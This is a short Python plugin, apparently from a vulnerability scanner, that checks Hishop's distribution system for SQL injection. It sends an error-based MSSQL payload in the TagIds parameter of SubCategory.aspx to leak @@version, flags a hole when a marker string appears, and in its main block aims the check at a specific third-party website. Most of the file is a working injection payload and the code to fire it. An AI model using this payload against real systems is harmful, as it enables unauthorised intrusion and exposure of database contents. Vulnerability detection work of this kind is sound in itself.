#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = Hishop易分销系统SQL注入漏洞
import re

def assign(service, arg):
    if service == "hishop":
        return True, arg

def audit(arg):
    payload = 'SubCategory.aspx?keywords=2&minSalePrice=&maxSalePrice=&categoryId=1\
&TagIds=convert%28int%2C%28char%2871%29%252Bchar%2865%29%252Bchar%2879%29%252Bchar%2832%29%252Bchar%2874%29%252Bchar\
%2873%29%252Bchar%2864%29%252B@@version%29%29&brand=27'
    target = arg + payload
    code, head,res, errcode, _   = curl.curl2(target)
    if code!=0 and 'GAO JI@Microsoft SQL Server' in res: 
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('hishop', 'http://spt.0351tao.cn/')[1])